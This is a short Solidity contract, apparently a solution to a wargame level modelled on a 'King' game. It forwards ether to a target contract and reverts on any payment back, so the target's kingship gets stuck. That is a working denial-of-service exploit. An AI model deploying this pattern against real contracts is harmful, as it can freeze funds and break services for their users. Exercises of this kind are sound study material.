// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.6.0;

contract KingAttack {
    function attack(address target) external payable {
        payable(target).transfer(msg.value);
    }

    receive() external payable {
        revert();
    }
}